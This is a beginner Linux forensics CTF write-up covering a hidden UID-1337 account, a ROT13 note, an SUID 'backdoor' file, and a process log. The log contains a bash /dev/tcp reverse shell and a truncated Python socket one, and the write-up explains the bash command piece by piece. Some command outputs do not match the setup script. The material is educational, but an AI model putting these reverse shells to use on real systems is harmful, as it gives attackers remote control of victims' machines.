@@ -1,0 +1,496 @@
+# CTF Writeup: The Spy's Backdoor
+**Author:** Me and Claude 
+**Platform:** Linux based  
+**Category:** Linux Fundamentals — Permissions, Forensics, Cryptography  
+**Difficulty:** Beginner → Intermediate  
+**Time Taken:** ~60 minutes  
+**Flag:** `CTF{y0u_f0und_th3_backd00r}`
+
+---
+
+## Table of Contents
+1. [Challenge Overview](#challenge-overview)
+2. [Environment Setup](#environment-setup)
+3. [Task 1 — Finding The Hidden User](#task-1--finding-the-hidden-user)
+4. [Task 2 — Finding The Hidden Note](#task-2--finding-the-hidden-note)
+5. [Task 3 — Analyzing The SUID Backdoor](#task-3--analyzing-the-suid-backdoor)
+6. [Task 4 — Reading The Process Log](#task-4--reading-the-process-log)
+7. [Key Concepts Learned](#key-concepts-learned)
+8. [Tools Used](#tools-used)
+9. [Mistakes I Made](#mistakes-i-made)
+10. [Real World Application](#real-world-application)
+
+---
+
+## Challenge Overview
+
+The story behind this challenge: a spy planted a backdoor on a Linux system and left 4 pieces of evidence behind before disappearing. My job was to act as a forensic investigator and find all 4 clues, understand what the spy did, and capture the hidden flag.
+
+The 4 things I needed to find:
+- A hidden user account the spy created
+- An encrypted note hidden inside a dotfile
+- A file with dangerous SUID permissions
+- Evidence of a reverse shell process
+
+This challenge covered real techniques used in actual penetration testing and CTF competitions.
+
+---
+
+## Environment Setup
+
+Before the challenge could begin, the environment needed to be built. This was done using a Python script that created the entire directory structure, files, and permissions automatically.
+
+```python
+python3 << 'EOF'
+import os, subprocess
+
+os.makedirs('/tmp/spy_case/logs', exist_ok=True)
+os.makedirs('/tmp/spy_case/.hidden', exist_ok=True)
+os.makedirs('/tmp/spy_case/system/proc', exist_ok=True)
+os.makedirs('/tmp/spy_case/files', exist_ok=True)
+EOF
+```
+
+**Breaking down each part of this setup:**
+
+`import os` — imports Python's operating system module, which lets Python interact with the Linux filesystem directly. Without this, Python cannot create folders, change permissions, or write files.
+
+`import subprocess` — imports the subprocess module which lets Python run terminal commands from inside a Python script. Like having a terminal inside your code.
+
+`os.makedirs('/tmp/spy_case/logs', exist_ok=True)` — this creates a folder at the path `/tmp/spy_case/logs`. The `exist_ok=True` part means if the folder already exists, don't crash — just continue. Without `exist_ok=True`, running the script twice would throw an error.
+
+`/tmp/` — this is a special Linux directory that stores temporary files. It gets wiped when the system restarts. Perfect for challenge environments because it leaves no permanent mess.
+
+The script then created 4 evidence files:
+
+```python
+with open('/tmp/spy_case/logs/passwd.bak', 'w') as f:
+    f.write("""root:x:0:0:root:/root:/bin/bash
+sp3y_4g3nt:x:1337:1337::/home/sp3y_4g3nt:/bin/bash
+""")
+```
+
+`open('/tmp/spy_case/logs/passwd.bak', 'w')` — opens a file for writing (`'w'` mode). If the file doesn't exist, Python creates it. If it does exist, Python overwrites it completely.
+
+`as f` — assigns the opened file to the variable `f` so we can write to it using `f.write()`.
+
+```python
+os.chmod('/tmp/spy_case/files/backdoor', 0o4755)
+```
+
+`os.chmod()` — changes the permissions of a file. The `0o` prefix means octal (base 8) number system, which is how Linux stores permissions. `4755` in octal = SUID bit + standard rwxr-xr-x permissions. More on this in Task 3.
+
+---
+
+## Task 1 — Finding The Hidden User
+
+### What I Did
+
+```bash
+cat /tmp/spy_case/logs/passwd.bak
+```
+
+**Breaking down this command completely:**
+
+`cat` — short for "concatenate." This command reads a file and prints its entire contents to the terminal. It's one of the most used commands in Linux and CTFs. The name comes from its original purpose of concatenating (joining) multiple files together, but today it's mostly used just to read files.
+
+`/tmp/spy_case/logs/passwd.bak` — this is an absolute path. In Linux, paths starting with `/` always start from the root of the filesystem. This means: go to root `/`, then into `tmp`, then `spy_case`, then `logs`, then open the file named `passwd.bak`.
+
+### What I Found
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+sp3y_4g3nt:x:1337:1337::/home/sp3y_4g3nt:/bin/bash
+```
+
+### Understanding The passwd File Format
+
+The real `/etc/passwd` file on any Linux system stores user account information. Every line represents one user and follows this exact format:
+
+```
+username:password:UID:GID:comment:home_directory:shell
+```
+
+Breaking down the suspicious line:
+
+```
+sp3y_4g3nt : x  : 1337 : 1337 : : /home/sp3y_4g3nt : /bin/bash
+     │       │     │      │    │         │                  │
+     │       │     │      │    │         │                  └── Shell the user runs
+     │       │     │      │    │         └── Home directory
+     │       │     │      │    └── Comment (empty here)
+     │       │     │      └── GID (Group ID)
+     │       │     └── UID (User ID)
+     │       └── Password stored in /etc/shadow (x means go look there)
+     └── Username
+```
+
+### Why UID 1337 Is Suspicious
+
+On any standard Linux system, UIDs follow this pattern:
+
+```
+UID 0          = root (most powerful user, can do anything)
+UID 1-999      = system accounts (daemons, services like www-data)
+UID 1000+      = normal human users (created automatically in order: 1000, 1001, 1002...)
+```
+
+When a new user is created normally by the system, Linux assigns the next available UID automatically. So a legitimate system would have users with UIDs like 1000, 1001, 1002 — in order.
+
+UID 1337 was chosen manually and deliberately by the spy. No automatic system process would skip from 1002 to 1337. This is a red flag that someone intentionally created this account and specifically chose 1337.
+
+In hacker culture, 1337 means "leet" which is short for "elite." It has been used by hackers since the 1980s as a kind of signature. Seeing UID 1337 in a passwd file during a real investigation is basically the attacker leaving their calling card.
+
+**Real world application:** During penetration testing and incident response, one of the first things investigators check is `/etc/passwd` for unusual UIDs, usernames with strange characters (like underscores and numbers in `sp3y_4g3nt`), and accounts with `/bin/bash` shell access that shouldn't have it.
+
+---
+
+## Task 2 — Finding The Hidden Note
+
+### What I Did
+
+```bash
+find /tmp/spy_case -name ".*" -type f
+```
+
+**Breaking down every part of this command:**
+
+`find` — one of the most powerful commands in Linux. It searches for files and directories based on conditions you give it. Unlike `ls` which only shows one directory, `find` searches recursively through every subfolder automatically.
+
+`/tmp/spy_case` — this is the starting directory. `find` begins here and searches everything inside it, including all subdirectories no matter how deep.
+
+`-name ".*"` — this is a filter condition. The `-name` flag tells `find` to match files by their name. The `".*"` pattern means: find any file whose name starts with a dot (`.`). The `*` is a wildcard meaning "anything after the dot."
+
+Why does starting with a dot matter? In Linux, any file or directory whose name starts with `.` is hidden. When you run `ls` normally, hidden files are invisible. You need `ls -la` or `ls -a` to see them. This is why `.hidden` and `.note` were invisible without using `find`.
+
+`-type f` — this tells `find` to only return files (not directories). The `f` stands for "file." If we used `-type d` it would only return directories. Without `-type f`, the results would include hidden directories too, which adds noise.
+
+### What I Found
+
+```
+./.hidden/.note
+./files/backdoor
+./system/proc/suspicious.log
+./logs/passwd.bak
+```
+
+The important one is `./.hidden/.note`. The path breaks down as:
+- `.` = current search directory (`/tmp/spy_case`)
+- `.hidden` = a hidden directory (starts with dot)
+- `.note` = a hidden file inside that hidden directory (also starts with dot)
+
+Double hidden — the spy put a hidden file inside a hidden directory. Without `find`, this would be nearly impossible to locate manually.
+
+### Reading The Hidden Note
+
+```bash
+cat /tmp/spy_case/.hidden/.note
+```
+
+**Output:**
+```
+Uryyb ntrag. Gur frperg zrrgvat vf ng zvqavtug. Cnffjbeq: PGS{l0h_f0haq_gu3_onpxq00e}
+```
+
+This is clearly encrypted. Time to figure out what cipher was used.
+
+### Identifying The Cipher
+
+Looking at the encrypted text: `Uryyb ntrag`
+
+I noticed that if I look at the first word `Uryyb` — it has 5 letters like a common English greeting. Counting the alphabet shift manually:
+
+```
+U → H  (shifted back 13)
+r → e  (shifted back 13)
+y → l  (shifted back 13)
+y → l  (shifted back 13)
+b → o  (shifted back 13)
+```
+
+`Uryyb` = `Hello`. This is ROT13 — a Caesar cipher with a shift value of exactly 13.
+
+### Why ROT13 Specifically?
+
+ROT13 is special because 13 is exactly half of 26 (the number of letters in the alphabet). This means:
+- Encrypting and decrypting use the exact same operation
+- Apply ROT13 twice and you get back to the original
+- `encode(encode(text)) = text`
+
+This is why it's everywhere in CTFs — simple, elegant, and recognizable.
+
+### Decrypting The Note
+
+```bash
+cat /tmp/spy_case/.hidden/.note | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
+
+**Breaking down this command completely:**
+
+`cat /tmp/spy_case/.hidden/.note` — reads the hidden note file and outputs its contents.
+
+`|` — this is called a pipe. It takes the output from the command on the left and sends it as input to the command on the right. Instead of the text going to the terminal screen, it gets sent directly into the `tr` command. Pipes are fundamental to how Linux works — chaining simple commands together to do complex things.
+
+`tr` — short for "translate." This command replaces characters. It reads input and substitutes characters according to the mapping you give it.
+
+`'A-Za-z'` — the first argument to `tr`. This is the input character set. `A-Z` means all uppercase letters from A to Z. `a-z` means all lowercase letters from a to z. So this covers every letter in the alphabet.
+
+`'N-ZA-Mn-za-m'` — the second argument to `tr`. This is the replacement character set. It looks confusing but here's exactly what it means:
+
+```
+Input:       A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
+             ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓
+Output:      N O P Q R S T U V W X Y Z A B C D E F G H I J K L M
+```
+
+Every letter gets replaced by the letter 13 positions ahead of it. When it reaches Z it wraps around back to A. This is exactly ROT13.
+
+**Decrypted output:**
+```
+Hello agent. The secret meeting is at midnight. Password: CTF{y0u_f0und_th3_backd00r}
+```
+
+**Flag captured: `CTF{y0u_f0und_th3_backd00r}`**
+
+---
+
+## Task 3 — Analyzing The SUID Backdoor
+
+### What I Did
+
+```bash
+ls -la /tmp/spy_case/files/
+```
+
+**Breaking down this command completely:**
+
+`ls` — list directory contents. Shows files and folders in a directory.
+
+`-l` — long format flag. Instead of just showing filenames, this shows detailed information: permissions, owner, group, file size, modification date, and filename.
+
+`-a` — all files flag. Shows hidden files (those starting with `.`) that are normally invisible.
+
+`-la` — these two flags combined together. In Linux, single-character flags can be combined after one `-`. So `-la` is the same as `-l -a`.
+
+`/tmp/spy_case/files/` — the specific directory to list.
+
+### What I Found
+
+```
+total 12
+drwxrwxr-x 2 flag flag 4096 Mar 27 09:42 .
+drwxrwxr-x 6 flag flag 4096 Mar 27 09:42 ..
+-rwsr-xr-x 1 flag flag   37 Mar 27 09:42 backdoor
+```
+
+### Reading The Permission String
+
+The permission string `-rwsr-xr-x` looks confusing at first but it follows a strict format. Let me break it down character by character:
+
+```
+- r w s r - x r - x
+│ │ │ │ │ │ │ │ │ │
+│ │ │ │ │ │ │ │ │ └── Others: execute (x)
+│ │ │ │ │ │ │ │ └──── Others: no write (-)
+│ │ │ │ │ │ │ └────── Others: read (r)
+│ │ │ │ │ │ └──────── Group: execute (x)
+│ │ │ │ │ └────────── Group: no write (-)
+│ │ │ │ └──────────── Group: read (r)
+│ │ │ └────────────── Owner: SUID bit SET (s) ← DANGEROUS
+│ │ └──────────────── Owner: write (w)
+│ └────────────────── Owner: read (r)
+└──────────────────── File type (- = regular file, d = directory)
+```
+
+The permission string is divided into 4 sections:
+
+```
+-    rwx    r-x    r-x
+│     │      │      │
+│     │      │      └── Others (everyone else)
+│     │      └────────── Group
+│     └───────────────── Owner
+└─────────────────────── File type
+```
+
+### What Is The SUID Bit?
+
+SUID stands for Set User ID. It's represented by `s` in the owner's execute position instead of the normal `x`.
+
+**Normal file execution:**
+```
+You run a file → it executes with YOUR permissions
+```
+
+**SUID file execution:**
+```
+You run a file → it executes with the FILE OWNER'S permissions
+```
+
+So if root owns a file with SUID set, and you run that file as a normal user, the file runs with root permissions. You temporarily become root for the duration of that program.
+
+This is exactly what the spy planted. Anyone who runs `/tmp/spy_case/files/backdoor` gets root-level access — regardless of who they actually are.
+
+### Finding SUID Files On A Real System
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+`-perm -4000` — find files where the 4000 permission bit (SUID) is set. The `-` before 4000 means "at least these bits are set" rather than "exactly these bits."
+
+`2>/dev/null` — redirect error messages to `/dev/null` (Linux's trash bin). Without this, you get hundreds of "Permission denied" errors flooding the output. `2>` specifically redirects stderr (error output) while letting stdout (normal output) through.
+
+**Real world application:** Finding SUID files is step 2 of almost every Linux privilege escalation methodology. Tools like LinPEAS and LinEnum (automated privilege escalation scripts) specifically scan for SUID misconfigurations as one of their first checks.
+
+---
+
+## Task 4 — Reading The Process Log
+
+### What I Did
+
+```bash
+cat /tmp/spy_case/system/proc/suspicious.log
+```
+
+### What I Found
+
+```
+PID   USER        COMMAND
+1337  sp3y_4g3nt  /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+9999  root        python3 -c 'import socket,os,pty;s=socket.socket()...'
+```
+
+### Understanding The Reverse Shell
+
+The command on PID 1337 is one of the most famous commands in hacking:
+
+```bash
+/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+```
+
+Let me break down every single character:
+
+`/bin/bash` — the full path to the bash shell program on Linux. Using the full path instead of just `bash` ensures the command works regardless of the current PATH environment variable.
+
+`-i` — interactive flag. This opens bash in interactive mode, meaning it accepts input and produces output like a normal terminal session. Without `-i`, the shell would be non-interactive and wouldn't work for remote control.
+
+`>&` — this is output redirection. Normally `>` redirects standard output (stdout) to a file. The `&` means "redirect both stdout AND stderr together." So `>&` means redirect all output — both normal output and error messages.
+
+`/dev/tcp/10.0.0.1/4444` — this is the clever part. `/dev/tcp/` is a special virtual filesystem in bash. It's not a real file — it's a shortcut that bash provides to open a TCP network connection. The format is `/dev/tcp/IP_ADDRESS/PORT`. So this opens a TCP connection to IP address `10.0.0.1` on port `4444`.
+
+`0>&1` — this redirects file descriptor 0 (stdin, the input) to file descriptor 1 (stdout, the output). File descriptors are how Linux identifies input/output streams. `0` = stdin (keyboard input), `1` = stdout (screen output), `2` = stderr (error output). By redirecting `0` to `1`, we send input through the same network connection as output.
+
+**Putting it all together:**
+
+```
+Open bash interactively
+Send ALL output (stdout + stderr) → network connection to 10.0.0.1:4444
+Send ALL input (keyboard) ← through that same network connection
+
+Result: The hacker at 10.0.0.1 can type commands and see results
+        as if they were sitting at this machine's keyboard
+```
+
+### Why "Reverse" Shell?
+
+```
+Normal (bind) shell:   Hacker connects TO victim machine
+                       Hacker ──────────────► Victim:4444
+                       (firewall often blocks incoming connections)
+
+Reverse shell:         Victim connects TO hacker machine  
+                       Victim ──────────────► Hacker:4444
+                       (firewalls usually ALLOW outgoing connections)
+```
+
+Reverse shells are smarter than normal shells because they bypass firewalls. Most corporate firewalls block unsolicited incoming connections but allow outgoing connections (so employees can browse the web). A reverse shell abuses this by making the victim machine initiate the connection outward.
+
+### The Python Reverse Shell on PID 9999
+
+```python
+python3 -c 'import socket,os,pty;s=socket.socket()...'
+```
+
+`python3 -c` — run Python with a command string directly instead of a file. The `-c` flag means "execute this string as Python code."
+
+This is another common reverse shell technique. Python is more reliable than bash on some systems because bash's `/dev/tcp` trick only works in bash (not sh or other shells). Python's `socket` module creates network connections on any system with Python installed.
+
+**Real world application:** Recognizing reverse shells in process lists is a core skill for blue team defenders, incident responders, and SOC analysts. During a real security incident, running `ps aux` and looking for `/dev/tcp` or suspicious Python socket connections is standard procedure.
+
+---
+
+## Key Concepts Learned
+
+### 1. Linux File Permissions
+Every file has three sets of permissions: owner, group, and others. Each set has three bits: read (r=4), write (w=2), execute (x=1). These combine to form the octal permission numbers like 755, 644, 600 etc.
+
+### 2. SUID Bit
+The Set User ID bit (permission 4000) makes a file execute with the owner's permissions rather than the caller's permissions. If root owns a SUID file, running it gives temporary root access. This is one of the most exploited Linux misconfigurations.
+
+### 3. Hidden Files In Linux
+Any file or directory starting with `.` is hidden from normal `ls` output. Use `ls -a` or `find -name ".*"` to reveal them. Attackers frequently hide malicious files using dot prefixes.
+
+### 4. /etc/passwd Structure
+The passwd file stores user account info in the format `username:x:UID:GID:comment:home:shell`. Unusual UIDs outside the normal range, strange usernames, and accounts with `/bin/bash` shell that shouldn't exist are indicators of compromise.
+
+### 5. ROT13 Cipher
+A Caesar cipher with a shift of 13. Because 13 is half of 26, the same operation encrypts and decrypts. Recognizable in CTFs by how letters shift — common English words like "Hello" become "Uryyb."
+
+### 6. Reverse Shells
+A technique where the victim machine connects outward to the attacker's machine, bypassing firewalls. The bash reverse shell `/bin/bash -i >& /dev/tcp/IP/PORT 0>&1` is one of the most recognized commands in hacking.
+
+### 7. The find Command
+`find [path] [conditions]` searches recursively through all subdirectories. Key flags: `-name` for filename matching, `-type f` for files only, `-type d` for directories, `-perm` for permission matching.
+
+### 8. The pipe operator |
+Connects commands by sending the output of one command directly as input to the next. Fundamental to Linux command line usage and CTF automation.
+
+---
+
+## Tools Used
+
+| Tool | Command | Purpose |
+|------|---------|---------|
+| cat | `cat filename` | Read file contents |
+| find | `find /path -name ".*" -type f` | Search for hidden files |
+| ls | `ls -la` | List files with permissions |
+| tr | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` | ROT13 decryption |
+| pipe | `\|` | Chain commands together |
+| Python3 | `python3 << 'EOF'` | Run Python scripts in terminal |
+
+---
+
+## Mistakes I Made
+
+**Mistake 1 — Misreading the flag**
+When I first decrypted the flag I read `CTF{y0u_s0und_th3_backd00r}` instead of `CTF{y0u_f0und_th3_backd00r}`. The letter `f` looked like `s` on screen. 
+
+Lesson: In CTFs, flags are exact. One wrong character = wrong answer. Always read character by character, especially around similar looking characters: `0` vs `O`, `1` vs `l`, `f` vs `s`, `2` vs `z`.
+
+**Mistake 2 — Wrong find command path**
+When first running `find` I used a relative path instead of the full absolute path `/tmp/spy_case`. This returned different results.
+
+Lesson: Always use absolute paths (starting with `/`) in commands to avoid path confusion. Absolute paths work from anywhere regardless of your current directory.
+
+---
+
+## Real World Application
+
+Everything in this challenge maps directly to real cybersecurity techniques:
+
+**Hidden users in /etc/passwd** → Attackers create backdoor accounts after compromising a system. Defenders scan for unusual UIDs and usernames during incident response.
+
+**Hidden dotfiles** → Malware frequently hides configuration files and scripts in hidden directories. Linux forensics always includes searching for hidden files.
+
+**SUID exploitation** → One of the most common Linux privilege escalation techniques used in real penetration tests and CTF competitions like HackTheBox and OSCP.
+
+**Reverse shells** → The primary method attackers use to maintain persistent access after initial exploitation. Every penetration tester needs to recognize and create reverse shells.
+
+**ROT13/Caesar ciphers** → Basic encoding appears constantly in CTFs and sometimes in real obfuscated malware. Recognizing simple ciphers by eye is a valuable skill.
+
+---
+
+*Written as part of my public CTF learning journey. Follow along on LinkedIn for writeups and challenge walkthroughs.*
